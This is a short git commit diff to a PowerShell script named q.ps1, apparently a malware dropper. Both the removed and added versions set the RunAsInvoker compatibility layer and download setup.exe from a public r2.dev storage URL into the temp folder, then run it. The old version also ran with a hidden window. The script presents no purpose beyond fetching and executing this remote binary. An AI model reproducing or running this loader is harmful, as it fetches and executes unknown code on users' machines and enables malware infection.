3482a610b0baf88c5255c03102e87407083ae729
Nicholas Tritsaris <nicholas.tritsaris13@bk.ru>
2026-01-08 20:51:38 +1100

    Update q.ps1

--- q.ps1
+++ q.ps1
@@ -1,2 +1,7 @@
 $env:__COMPAT_LAYER = "RunAsInvoker"
-powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://pub-8abdfb6034424ca983a3c8c7fe0b5574.r2.dev/setup.exe' -OutFile '$env:TEMP\setup.exe'; & $env:TEMP\setup.exe"
+
+Invoke-WebRequest `
+  -Uri "https://pub-8abdfb6034424ca983a3c8c7fe0b5574.r2.dev/setup.exe" `
+  -OutFile "$env:TEMP\setup.exe"
+
+& "$env:TEMP\setup.exe"
